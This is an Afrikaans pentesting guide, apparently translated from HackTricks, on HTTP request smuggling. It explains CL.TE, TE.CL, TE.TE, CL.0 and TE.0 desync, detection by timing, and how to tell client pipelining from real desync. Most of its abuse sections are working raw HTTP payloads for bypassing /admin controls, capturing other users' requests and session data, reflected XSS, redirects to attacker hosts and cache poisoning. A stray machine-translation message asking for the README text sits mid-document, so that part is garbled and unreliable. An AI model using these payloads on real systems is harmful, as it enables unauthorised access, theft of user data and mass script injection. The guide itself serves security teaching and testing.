# HTTP Request Smuggling / HTTP Desync Attack

{{#include ../../banners/hacktricks-training.md}}


## Wat is

Hierdie kwesbaarheid gebeur wanneer 'n **desinchronisasie** tussen **front-end proxies** en die **back-end** server toelaat dat 'n **attacker** 'n HTTP **request** stuur wat deur die **front-end** proxies (load balance/reverse-proxy) as 'n **single request** geïnterpreteer word en deur die **back-end** server **as 2 request**.\
Dit stel 'n gebruiker in staat om **die volgende request wat by die back-end server ná sy eie inkom te wysig**.

### Teorie

[**RFC Specification (2161)**](https://tools.ietf.org/html/rfc2616)

> If a message is received with both a Transfer-Encoding header field and a Content-Length header field, the latter MUST be ignored.

**Content-Length**

> The Content-Length entity header indicates the size of the entity-body, in bytes, sent to the recipient.

**Transfer-Encoding: chunked**

> The Transfer-Encoding header specifies the form of encoding used to safely transfer the payload body to the user.\
> Chunked means that large data is sent in a series of chunks

### Werklikheid

Die **Front-End** (n load-balance / Reverse Proxy) verwerk die _**Content-Length**_ of die _**Transfer-Encoding**_ header en die **Back-end** server verwerk die ander een, wat 'n **desinchronisasie** tussen die 2 stelsels veroorsaak.\
Dit kan baie kritiek wees aangesien **'n attacker een request na die reverse proxy kan stuur** wat deur die **back-end** server **as 2 verskillende requests** geïnterpreteer word. Die gevaar van hierdie tegniek lê daarin dat die **back-end** server die **2de geïnjekteerde request** asof dit **van die volgende kliënt kom** sal interpreteer en die werklike request van daardie kliënt deel van die **geïnjekteerde request** sal wees.

### Besonderhede

Onthou dat in HTTP **'n nuwe reël karakter uit 2 bytes bestaan:**

- **Content-Length**: Hierdie header gebruik 'n **desimale nommer** om die **aantal bytes** van die **body** van die request aan te dui. Die body word verwag om op die laaste karakter te eindig; **'n nuwe reël is nie nodig aan die einde van die request nie**.
- **Transfer-Encoding:** Hierdie header gebruik in die **body** 'n **heksadesimale nommer** om die **aantal bytes** van die **volgende chunk** aan te dui. Die **chunk** moet **eindig** met 'n **nuwe reël**, maar dié nuwe reël **word nie deur die lengte-aanwyser ingesluit nie**. Hierdie oordragmetode moet eindig met 'n **chunk van grootte 0 gevolg deur 2 new lines**: `0`
- **Connection**: Gebaseer op my ervaring word dit aanbeveel om `Connection: keep-alive` te gebruik op die eerste request van die request Smuggling.

## Basiese Voorbeelde

> [!TIP]
> Wanneer jy probeer om dit met Burp Suite te exploit **deaktiveer `Update Content-Length` en `Normalize HTTP/1 line endings`** in die repeater omdat sommige gadgets newlines, carriage returns en malformed content-lengths misbruik.

HTTP request smuggling-aanvalle word geskep deur ambigue requests te stuur wat die verskille in hoe front-end en back-end servers die `Content-Length` (CL) en `Transfer-Encoding` (TE) headers interpreteer, uitbuit. Hierdie aanvalle kan in verskillende vorme voorkom, hoofsaaklik as **CL.TE**, **TE.CL**, en **TE.TE**. Elke tipe verteenwoordig 'n unieke kombinasie van hoe die front-end en back-end servers hierdie headers prioriseer. Die kwesbaarhede ontstaan omdat die servers dieselfde request op verskillende maniere verwerk, wat tot onverwagte en moontlik kwaadwillige uitkomste kan lei.

### Basiese Voorbeelde van Kwetsbaarheidstipes

![https://twitter.com/SpiderSec/status/1200413390339887104?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1200413390339887104&ref_url=https%3A%2F%2Ftwitter.com%2FSpiderSec%2Fstatus%2F1200413390339887104](../../images/EKi5edAUUAAIPIK.jpg)

> [!TIP]
> By die vorige tabel moet jy die TE.0 technique byvoeg, soos die CL.0 technique maar met Transfer-Encoding.

#### CL.TE Vulnerability (Content-Length used by Front-End, Transfer-Encoding used by Back-End)

- **Front-End (CL):** Verwerk die request gebaseer op die `Content-Length` header.
- **Back-End (TE):** Verwerk die request gebaseer op die `Transfer-Encoding` header.
- **Attack Scenario:**

- Die attacker stuur 'n request waar die waarde van die `Content-Length` header nie ooreenstem met die werklike inhouds-lengte nie.
- Die front-end server stuur die hele request na die back-end, gebaseer op die `Content-Length` waarde.
- Die back-end server verwerk die request as chunked weens die `Transfer-Encoding: chunked` header, en interpreteer die oorblywende data as 'n aparte, opvolgende request.
- **Example:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 30
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
Foo: x
```

#### TE.CL Vulnerability (Transfer-Encoding used by Front-End, Content-Length used by Back-End)

- **Front-End (TE):** Verwerk die request gebaseer op die `Transfer-Encoding` header.
- **Back-End (CL):** Verwerk die request gebaseer op die `Content-Length` header.
- **Attack Scenario:**

- Die attacker stuur 'n chunked request waar die chunk-grootte (`7b`) en die werklike inhoudslengte (`Content-Length: 4`) nie ooreenstem nie.
- Die front-end server, wat `Transfer-Encoding` eerbiedig, stuur die hele request na die back-end.
- Die back-end server, wat `Content-Length` eerbiedig, verwerk slegs die aanvanklike deel van die request (`7b` bytes), wat die res laat as deel van 'n onverwagte daaropvolgende request.
- **Example:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 4
Connection: keep-alive
Transfer-Encoding: chunked

7b
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

x=
0

```

#### TE.TE Vulnerability (Transfer-Encoding used by both, with obfuscation)

- **Servers:** Albei ondersteun `Transfer-Encoding`, maar een kan mislei word om dit te ignoreer deur obfuskasie.
- **Attack Scenario:**

- Die attacker stuur 'n request met obfuskated `Transfer-Encoding` headers.
- Afhangende van watter server (front-end of back-end) die obfuskasie nie herken nie, kan 'n CL.TE of TE.CL kwesbaarheid uitgebuit word.
- Die onverwerkte deel van die request, soos deur een van die servers gesien, word deel van 'n opvolgende request en lei tot smuggling.
- **Example:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

#### **CL.CL Scenario (Content-Length used by both Front-End and Back-End)**

- Albei servers verwerk die request slegs gebaseer op die `Content-Length` header.
- Hierdie scenario lei gewoonlik nie tot smuggling nie, aangesien daar belyning is in hoe beide servers die request-lengte interpreteer.
- **Example:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

Normal Request
```

#### **CL.0 Scenario**

- Verwys na scenario's waar die `Content-Length` header teenwoordig is en 'n waarde anders as nul het, wat aandui dat die request-body inhoud het. Die back-end ignoreer die `Content-Length` header (wat as 0 behandel word), maar die front-end parse dit.
- Dit is baie belangrik in die begrip en samestelling van smuggling-aanvalle, aangesien dit beïnvloed hoe servers die einde van 'n request bepaal.
- **Example:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

Non-Empty Body
```

#### TE.0 Scenario

- Soos die vorige een maar met TE.
- Technique [reported here](https://www.bugcrowd.com/blog/unveiling-te-0-http-request-smuggling-discovering-a-critical-vulnerability-in-thousands-of-google-cloud-websites/)
- **Example**:
```
OPTIONS / HTTP/1.1
Host: {HOST}
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
Transfer-Encoding: chunked
Connection: keep-alive

50
GET <http://our-collaborator-server/> HTTP/1.1
x: X
0
EMPTY_LINE_HERE
EMPTY_LINE_HERE
```
#### Die webbediener breek

Hierdie tegniek is ook nuttig in scenario's waarin dit moontlik is om **break a web server while reading the initial HTTP data** maar **without closing the connection**. Op hierdie manier sal die **body** van die HTTP request beskou word as die **next HTTP request**.

Byvoorbeeld, soos verduidelik in [**this writeup**](https://mizu.re/post/twisty-python), in Werkzeug was dit moontlik om sommige **Unicode** karakters te stuur wat die bediener laat **break**. As die HTTP-verbinding egter geskep is met die header **`Connection: keep-alive`**, sal die body van die request nie gelees word nie en sal die verbinding steeds oop bly, sodat die **body** van die request as die **next HTTP request** behandel sal word.

#### Dwing via hop-by-hop headers

Deur hop-by-hop headers te misbruik kan jy die proxy aanwys om **delete the header Content-Length or Transfer-Encoding so a HTTP request smuggling is possible to abuse**.
```
Connection: Content-Length
```
For **more information about hop-by-hop headers** visit:


{{#ref}}
../abusing-hop-by-hop-headers.md
{{#endref}}

## Opsporing van HTTP Request Smuggling

Die identifisering van HTTP request smuggling-kwesbaarhede kan dikwels bereik word deur timing-tegnieke, wat staatmaak op die waarneming van hoe lank dit neem vir die bediener om op gemanipuleerde versoeke te reageer. Hierdie tegnieke is veral nuttig om CL.TE en TE.CL kwesbaarhede op te spoor. Benewens hierdie metodes is daar ander strategieë en gereedskap wat gebruik kan word om sulke kwesbaarhede te vind:

### Opsporing van CL.TE-kwesbaarhede met timing-tegnieke

- **Metode:**

- Stuur 'n versoek wat, indien die toepassing kwesbaar is, die back-end server sal veroorsaak om vir addisionele data te wag.
- **Voorbeeld:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 4

1
A
0
```

- **Waarneming:**
- Die front-end server verwerk die versoek gebaseer op `Content-Length` en kap die boodskap voortydig af.
- Die back-end server, wat 'n chunked boodskap verwag, wag vir die volgende chunk wat nooit aankom nie, wat 'n vertraging veroorsaak.

- **Aanwysers:**
- Time-outs of lang vertragings in die reaksie.
- Ontvang 'n 400 Bad Request fout vanaf die back-end server, soms met gedetailleerde bedienerinligting.

### Opsporing van TE.CL-kwesbaarhede met timing-tegnieke

- **Metode:**

- Stuur 'n versoek wat, indien die toepassing kwesbaar is, die back-end server sal veroorsaak om vir addisionele data te wag.
- **Voorbeeld:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 6

0
X
```

- **Waarneming:**
- Die front-end server verwerk die versoek gebaseer op `Transfer-Encoding` en stuur die hele boodskap vooruit.
- Die back-end server, wat 'n boodskap gebaseer op `Content-Length` verwag, wag vir addisionele data wat nooit aankom nie, wat 'n vertraging veroorsaak.

### Ander metodes om kwesbaarhede te vind

- **Differential Response Analysis:**
- Stuur effens veranderde weergawes van 'n versoek en kyk of die bedienerreaksies onverwags verskil — dit dui op 'n parsing-onderskeid.
- **Using Automated Tools:**
- Tools soos Burp Suite se 'HTTP Request Smuggler' extension kan outomaties vir hierdie kwesbaarhede toets deur verskeie vorme van dubbelsinnige versoeke te stuur en die reaksies te ontleed.
- **Content-Length Variance Tests:**
- Stuur versoeke met wisselende `Content-Length` waardes wat nie ooreenstem met die werklike inhoudslengte nie en kyk hoe die bediener sulke wanpassings hanteer.
- **Transfer-Encoding Variance Tests:**
- Stuur versoeke met verhulde of misvormde `Transfer-Encoding` headers en monitor hoe uiteenlopend die front-end en back-end servers op sulke manipulasies reageer.

### HTTP Request Smuggling Kwesbaarheidstoetsing

Nadat jy die doeltreffendheid van timing-tegnieke bevestig het, is dit noodsaaklik om te verifieer of kliëntversoeke gemanipuleer kan word. 'n Eenvoudige metode is om te probeer om jou versoeke te vergiftig; byvoorbeeld om 'n versoek na `/` 'n 404-response te laat gee. Die `CL.TE` en `TE.CL` voorbeelde wat vroeër in [Basic Examples](#basic-examples) bespreek is, demonstreer hoe om 'n kliënt se versoek te vergiftig om 'n 404-response uit te lok, ondanks dat die kliënt probeer om 'n ander hulpbron te bereik.

**Belangrike oorwegings**

Wanneer jy vir request smuggling-kwesbaarhede toets deur ander versoeke te ontwrig, hou die volgende in gedagte:

- **Afsonderlike netwerkverbindings:** Die "attack" en "normal" versoeke moet oor aparte netwerkverbindings gestuur word. Om dieselfde verbinding vir albei te gebruik, bevestig nie die teenwoordigheid van die kwesbaarheid nie.
- **Konstante URL en parameters:** Streef daarna om identiese URLs en parametername vir albei versoeke te gebruik. Moderne toepassings router versoeke dikwels na spesifieke back-end servers gebaseer op URL en parameters. Om dit te laat ooreenstem verhoog die waarskynlikheid dat albei versoeke deur dieselfde bediener verwerk word, 'n voorvereiste vir 'n successful attack.
- **Timing en wedren-toestande:** Die "normal" versoek, bedoel om interferensie van die "attack" versoek te detecteer, wed teen ander gelyktydige toepassingsversoeke. Stuur dus die "normal" versoek onmiddellik ná die "attack" versoek. Besige toepassings mag meerdere probeerslae vereis vir 'n beslissende bevestiging.
- **Load Balancing-uitdagings:** Front-end servers wat as load balancers optree kan versoeke oor verskeie back-end stelsels versprei. As die "attack" en "normal" versoeke op verskillende stelsels eindig, sal die attack nie slaag nie. Hierdie load balancing-aspek mag verskeie pogings vereis om 'n kwesbaarheid te bevestig.
- **Onbedoelde gebruikersimpak:** As jou attack per ongeluk 'n ander gebruiker se versoek (@ nie die "normal" versoek wat jy vir detectie gestuur het nie) raak, dui dit aan dat jou attack 'n ander toepassingsgebruiker beïnvloed het. Aanhoudende toetse kan ander gebruikers ontwrig, dus gaan versigtig te werk.

## Onderskei HTTP/1.1 pipelining-artefakte vs genuine request smuggling

Verbindingshergebruik (keep-alive) en pipelining kan maklik illusies van "smuggling" produseer in testing tools wat veelvuldige versoeke op dieselfde sok stuur. Leer om onskadelike kliënt-kant-artefakte van werklike bediener-kant desync te onderskei.

### Waarom pipelining klassieke vals-positiewe veroorsaak

HTTP/1.1 hergebruik 'n enkele TCP/TLS-verbinding en koppel versoeke en reaksies saam op dieselfde stroom. In pipelining stuur die kliënt meerdere versoeke agtereenvolgens en staatmaak op in-orde reaksies. 'n Algemene vals-positief is om 'n misvormde CL.0-styl payload twee keer op 'n enkele verbinding te herstuur:
```
POST / HTTP/1.1
Host: hackxor.net
Content_Length: 47

GET /robots.txt HTTP/1.1
X: Y
```
I don't have the contents of src/pentesting-web/http-request-smuggling/README.md. Please paste the README.md text you want translated to Afrikaans (I'll keep markdown, tags, links and code unchanged and follow your guidance).
```
HTTP/1.1 200 OK
Content-Type: text/html

```

```
HTTP/1.1 200 OK
Content-Type: text/plain

User-agent: *
Disallow: /settings
```
As die server die misvormde `Content_Length` geïgnoreer het, is daar geen FE↔BE desync nie. Met reuse het jou client eintlik hierdie byte-stream gestuur, wat die server as twee onafhanklike requests ontleed het:
```
POST / HTTP/1.1
Host: hackxor.net
Content_Length: 47

GET /robots.txt HTTP/1.1
X: YPOST / HTTP/1.1
Host: hackxor.net
Content_Length: 47

GET /robots.txt HTTP/1.1
X: Y
```
Impact: none. Jy het net jou kliënt van die server-framing desinkroniseer.

> [!TIP]
> Burp modules that depend on reuse/pipelining: Turbo Intruder with `requestsPerConnection>1`, Intruder with "HTTP/1 connection reuse", Repeater "Send group in sequence (single connection)" or "Enable connection reuse".

### Litmus-toetse: pipelining of werklike desync?

1. Disable reuse and re-test
- In Burp Intruder/Repeater, skakel HTTP/1 reuse af en vermy "Send group in sequence".
- In Turbo Intruder, stel `requestsPerConnection=1` en `pipeline=False`.
- As die gedrag verdwyn, was dit waarskynlik client-side pipelining, tensy jy te doen het met connection-locked/stateful targets of client-side desync.
2. HTTP/2 nested-response check
- Stuur 'n HTTP/2 request. As die response body 'n volledige geneste HTTP/1 response bevat, het jy 'n backend parsing/desync fout bewys in plaas van 'n suiwer client-artifact.
3. Partial-requests probe for connection-locked front-ends
- Sommige FEs hergebruik die upstream BE-verbinding slegs as die kliënt hullene hergebruik het. Gebruik partial-requests om FE-gedrag op te spoor wat client-reuse naboots.
- Sien PortSwigger "Browser‑Powered Desync Attacks" vir die connection-locked tegniek.
4. State probes
- Kyk vir verskille tussen die eerste en daaropvolgende requests op dieselfde TCP-verbinding (first-request routing/validation).
- Burp "HTTP Request Smuggler" sluit 'n connection‑state probe in wat dit outomatiseer.
5. Visualiseer die wire
- Gebruik die Burp "HTTP Hacker" extension om concatenation en message framing direk te inspekteer terwyl jy met reuse en partial requests eksperimenteer.

### Connection‑locked request smuggling (reuse-required)

Sommige front-ends hergebruik die upstream verbinding slegs wanneer die kliënt hullene hergebruik. Werklike smuggling bestaan, maar dit is voorwaardelik aan client-side reuse. Om te onderskei en impak te bewys:
- Bewys die server-side fout
- Gebruik die HTTP/2 nested-response check, of
- Gebruik partial-requests om te toon dat die FE slegs upstream hergebruik wanneer die kliënt dit doen.
- Wys werklike impak selfs as direkte cross-user socket misbruik geblokkeer is:
- Cache poisoning: vergiftig gedeelde caches via die desync sodat responses ander gebruikers raak.
- Internal header disclosure: reflekteer FE-geïnjekteerde headers (bv. auth/trust headers) en pivot na auth bypass.
- Bypass FE controls: smuggle beperkte paths/methods verby die front-end.
- Host-header abuse: kombineer met host routing quirks om na interne vhosts te pivot.
- Operator workflow
- Reproduceer met beheerde reuse (Turbo Intruder `requestsPerConnection=2`, or Burp Repeater tab group → "Send group in sequence (single connection)").
- Ketting dan na cache/header-leak/control-bypass primitives en demonstreer cross-user of authorization impak.

> See also connection‑state attacks, which are closely related but not technically smuggling:
>
>{{#ref}}
>../http-connection-request-smuggling.md
>{{#endref}}

### Client‑side desync constraints

As jy browser-powered/client-side desync teiken, moet die kwaadwillige request deur 'n blaaier cross-origin gestuur kan word. Header obfuscation trucs gaan nie werk nie. Fokus op primitives bereikbaar via navigation/fetch, en pivot dan na cache poisoning, header disclosure, of front-end control bypass waar downstream-komponente responses reflekteer of cache.

For background and end-to-end workflows:

{{#ref}}
browser-http-request-smuggling.md
{{#endref}}

### Tooling to help decide

- HTTP Hacker (Burp BApp Store): beklemtoon low-level HTTP gedrag en socket concatenation.
- "Smuggling or pipelining?" Burp Repeater Custom Action: https://github.com/PortSwigger/bambdas/blob/main/CustomAction/SmugglingOrPipelining.bambda
- Turbo Intruder: presiese beheer oor connection reuse via `requestsPerConnection`.
- Burp HTTP Request Smuggler: sluit 'n connection‑state probe in om first‑request routing/validation op te spoor.

> [!NOTE]
> Beskou reuse-only effekte as nie-probleme tensy jy server-side desync kan bewys en konkrete impak kan heg (poisoned cache artifact, leaked internal header wat privilege bypass moontlik maak, bypassed FE control, ens.).

## Abusing HTTP Request Smuggling

### Om Front-End sekuriteit te omseil via HTTP Request Smuggling

Soms afdwing front-end proxies sekuriteitsmaatreëls en ondersoek inkomende requests noukeurig. Hierdie maatreëls kan egter omseil word deur HTTP Request Smuggling te misbruik, wat ongemagtigde toegang tot beperkte endpoints moontlik maak. Byvoorbeeld, toegang tot `/admin` mag ekstern verbied wees, met die front-end proxy wat sulke pogings aktief blokkeer. Nietemin mag hierdie proxy nalaat om ingeslote requests binne 'n gesmugglede HTTP request te inspekteer, wat 'n leemte laat vir die omseiling van hierdie beperkings.

Oorweeg die volgende voorbeelde wat illustreer hoe HTTP Request Smuggling gebruik kan word om front-end sekuriteitskontroles te omseil, spesifiek gerig op die `/admin` pad wat gewoonlik deur die front-end proxy beskerm word:

**CL.TE Voorbeeld**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 67
Transfer-Encoding: chunked

0
GET /admin HTTP/1.1
Host: localhost
Content-Length: 10

x=
```
In die CL.TE attack word die `Content-Length` header benut vir die aanvanklike versoek, terwyl die daaropvolgende ingeslote versoek die `Transfer-Encoding: chunked` header gebruik. Die front-end proxy verwerk die aanvanklike `POST` versoek maar slaag nie daarin om die ingeslote `GET /admin` versoek te inspekteer nie, wat ongemagtigde toegang tot die `/admin` pad toelaat.

**TE.CL Example**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 4
Transfer-Encoding: chunked
2b
GET /admin HTTP/1.1
Host: localhost
a=x
0

```
Omgekeerd, in die TE.CL-aanval gebruik die aanvanklike `POST`-versoek `Transfer-Encoding: chunked`, en die daaropvolgende ingeslote versoek word verwerk op grond van die `Content-Length`-header. Soortgelyk aan die CL.TE-aanval, ignoreer die front-end proxy die gesmokkelde `GET /admin`-versoek, wat per ongeluk toegang tot die beperkte `/admin`-pad verleen.

### Front-end versoekherskryfing openbaar <a href="#revealing-front-end-request-rewriting" id="revealing-front-end-request-rewriting"></a>

Toepassings maak dikwels gebruik van 'n **front-end server** om inkomende versoeke te wysig voordat hulle aan die back-end server oorgedra word. 'n Tipiese wysiging behels die byvoeging van headers, soos `X-Forwarded-For: <IP of the client>`, om die kliënt se IP aan die back-end deur te gee. Om hierdie wysigings te verstaan kan beslissend wees, aangesien dit maniere kan openbaar om **beskermings te omseil** of **verborgen inligting of eindpunte te openbaar**.

Om te ondersoek hoe 'n proxy 'n versoek verander, lokaliseer 'n POST-parameter wat die back-end in die antwoord weerspieël. Vorm dan 'n versoek waarin jy hierdie parameter laaste gebruik, soortgelyk aan die volgende:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 130
Connection: keep-alive
Transfer-Encoding: chunked

0

POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

search=
```
In hierdie struktuur word daaropvolgende versoek-komponente aangeheg na `search=`, wat die parameter is wat in die antwoord weerspieël word. Hierdie weerspieëling sal die headers van die daaropvolgende versoek openbaar.

Dit is belangrik om die `Content-Length` header van die geneste versoek in lyn te bring met die werklike inhoudslengte. Begin met 'n klein waarde en verhoog geleidelik — dit is raadsaam, aangesien te lae 'n waarde die weerspieëlde data kan afkap, terwyl te hoë 'n waarde die versoek kan laat misluk.

Hierdie tegniek is ook toepaslik in die konteks van 'n TE.CL-kwesbaarheid, maar die versoek moet eindig met `search=\r\n0`. Ongeag die reëlbreukkarakters sal die waardes by die search-parameter aangeheg word.

Hierdie metode dien hoofsaaklik om die versoek-wysigings wat deur die front-end proxy gemaak word, te verstaan — dit voer in wese 'n selfgedrewe ondersoek uit.

### Vasvang van ander gebruikers se versoeke <a href="#capturing-other-users-requests" id="capturing-other-users-requests"></a>

Dit is moontlik om die versoeke van die volgende gebruiker te vang deur 'n spesifieke versoek as die waarde van 'n parameter tydens 'n POST-operasie aan te heg. So kan dit bereik word:

Deur die volgende versoek as die waarde van 'n parameter aan te heg, kan jy die daaropvolgende kliënt se versoek stoor:
```
POST / HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 319
Connection: keep-alive
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Length: 659
Content-Type: application/x-www-form-urlencoded
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi

csrf=gpGAVAbj7pKq7VfFh45CAICeFCnancCM&postId=4&name=asdfghjklo&email=email%40email.com&comment=
```
In hierdie scenario is die **comment-parameter** bedoel om die inhoud binne 'n pos se kommentaarafdeling op 'n publiek toeganklike bladsy te stoor. Gevolglik sal die inhoud van die daaropvolgende versoek as 'n kommentaar verskyn.

Hierdie tegniek het egter beperkings. Oor die algemeen vang dit data slegs tot by die parameter-afskeider wat in die gesmokkelde versoek gebruik word. Vir URL-gekodeerde formulierindienings is hierdie afskeider die `&` karakter. Dit beteken die vasgevangde inhoud van die slagoffer se versoek sal by die eerste `&` stop, wat selfs deel van die query string kan wees.

Verder is dit die moeite werd om te noem dat hierdie benadering ook werk met 'n TE.CL kwesbaarheid. In sulke gevalle moet die versoek eindig met `search=\r\n0`. Ongeag newline-karakters, sal die waardes by die search-parameter gevoeg word.

### Gebruik van HTTP Request Smuggling om Reflected XSS te misbruik

HTTP Request Smuggling kan gebruik word om webblaaie wat kwesbaar is vir **Reflected XSS** uit te buit, en bied beduidende voordele:

- Interaksie met die teikengebruikers is **nie benodig nie**.
- Dit maak dit moontlik om XSS uit te buit in dele van die versoek wat **gewoonlik onbereikbaar** is, soos HTTP request headers.

In scenario's waar 'n webwerf vatbaar is vir Reflected XSS deur die User-Agent header, demonstreer die volgende payload hoe om hierdie kwesbaarheid te misbruik:
```
POST / HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
Cookie: session=ac311fa41f0aa1e880b0594d008d009e
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 213
Content-Type: application/x-www-form-urlencoded

0

GET /post?postId=2 HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: "><script>alert(1)</script>
Content-Length: 10
Content-Type: application/x-www-form-urlencoded

A=
```
Hierdie payload is gestruktureer om die kwesbaarheid uit te buit deur:

1. Initieer 'n `POST` request, skynbaar tipies, met 'n `Transfer-Encoding: chunked` header om die begin van smuggling aan te dui.
2. Daarna 'n `0`, wat die einde van die chunked boodskapliggaam aandui.
3. Dan word 'n smuggled `GET` request ingevoer, waar die `User-Agent` header met 'n script ingespuit word, `<script>alert(1)</script>`, wat die XSS aktiveer wanneer die bediener hierdie daaropvolgende request verwerk.

Deur die `User-Agent` deur smuggling te manipuleer, omseil die payload normale request-beperkings en benut dus die Reflected XSS-kwesbaarheid op 'n nie-standaard maar effektiewe wyse.

#### HTTP/0.9

> [!CAUTION]
> As die gebruikerinhoud in 'n response gereflekteer word met 'n **`Content-type`** soos **`text/plain`**, kan dit die uitvoering van die XSS voorkom. As die bediener **HTTP/0.9** ondersteun, mag dit moontlik wees om dit te omseil!

Die weergawe HTTP/0.9 was vroeër as 1.0 en gebruik slegs **GET**-werkwoorde en **reageer nie** met **headers** nie, net die liggaam.

In [**this writeup**](https://mizu.re/post/twisty-python), is dit misbruik met request smuggling en 'n **kwetsbare endpoint wat met die gebruiker se inset sal antwoord** om 'n request met HTTP/0.9 te smuggle. Die parameter wat in die response gereflekteer sal word, het 'n **vals HTTP/1.1 response (with headers and body)** bevat, sodat die response geldige uitvoerbare JS-kode sal bevat met 'n `Content-Type` van `text/html`.

### Exploiting On-site Redirects with HTTP Request Smuggling <a href="#exploiting-on-site-redirects-with-http-request-smuggling" id="exploiting-on-site-redirects-with-http-request-smuggling"></a>

Aplikasies herlei dikwels vanaf een URL na 'n ander deur die hostname uit die `Host`-header in die herleidings-URL te gebruik. Dit is algemeen by webservers soos Apache en IIS. Byvoorbeeld, om 'n gids te vra sonder 'n trailing slash lei tot 'n herleiding om die / in te sluit:
```
GET /home HTTP/1.1
Host: normal-website.com
```
Leid tot:
```
HTTP/1.1 301 Moved Permanently
Location: https://normal-website.com/home/
```
Hoewel dit skynbaar onskadelik is, kan hierdie gedrag gemanipuleer word met behulp van HTTP request smuggling om gebruikers na 'n eksterne webwerf te herlei. Byvoorbeeld:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 54
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com
Foo: X
```
Hierdie gesmokkelde versoek kan veroorsaak dat die volgende verwerkte gebruikersversoek herlei word na ’n webwerf wat deur ’n aanvaller beheer word:
```
GET /home HTTP/1.1
Host: attacker-website.com
Foo: XGET /scripts/include.js HTTP/1.1
Host: vulnerable-website.com
```
Gevolg:
```
HTTP/1.1 301 Moved Permanently
Location: https://attacker-website.com/home/
```
In hierdie scenario word 'n gebruiker se versoek vir 'n JavaScript-lêer gekaap. Die aanvaller kan moontlik die gebruiker kompromitteer deur kwaadwillige JavaScript as antwoord te bedien.

### Uitbuiting van Web Cache Poisoning via HTTP Request Smuggling <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

Web Cache Poisoning kan uitgevoer word as enige komponent van die **front-end infrastructure caches content** inhoud kas, gewoonlik om prestasie te verbeter. Deur die bediener se antwoord te manipuleer, is dit moontlik om die kas te vergiftig.

Eerder het ons gesien hoe bediener-antwoorde verander kan word om 'n 404-fout terug te gee (verwys na [Basic Examples](#basic-examples)). Op dieselfde wyse is dit haalbaar om die bediener te mislei om die inhoud van `/index.html` te lewer as antwoord op 'n versoek vir `/static/include.js`. Gevolglik word die inhoud van `/static/include.js` in die kas vervang deur dié van `/index.html`, wat `/static/include.js` ontoeganklik vir gebruikers maak en moontlik lei tot 'n Denial of Service (DoS).

Hierdie tegniek word besonder kragtig as 'n **Open Redirect vulnerability** gevind word of as daar 'n **on-site redirect to an open redirect** is. Sulke kwesbaarhede kan uitgebuit word om die gekasde inhoud van `/static/include.js` te vervang met 'n script onder die aanvaller se beheer, wat in wese 'n wye verspreide Cross-Site Scripting (XSS)-aanval teen alle kliënte wat die opgedateerde `/static/include.js` versoek, moontlik maak.

Hieronder is 'n illustrasie van die uitbuiting van **cache poisoning combined with an on-site redirect to open redirect**. Die doel is om die kasinhoud van `/static/include.js` te verander om JavaScript-kode te bedien wat deur die aanvaller beheer word:
```
POST / HTTP/1.1
Host: vulnerable.net
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 124
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: attacker.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
```
Let op die ingeslote versoek wat teiken na `/post/next?postId=3`. Hierdie versoek sal herlei word na `/post?postId=4`, deur gebruik te maak van die **Host header value** om die domein te bepaal. Deur die **Host header** te verander, kan die aanvaller die versoek na hul domein herlei (**on-site redirect to open redirect**).

Na suksesvolle **socket poisoning**, moet 'n **GET request** vir `/static/include.js` geïnisieer word. Hierdie versoek sal besoedel word deur die vorige **on-site redirect to open redirect** versoek en die inhoud van die deur die aanvaller beheerde script haal.

Daarna sal enige versoek vir `/static/include.js` die gestoorde inhoud van die aanvaller se script bedien, wat effektief 'n wye XSS-aanval ontketen.

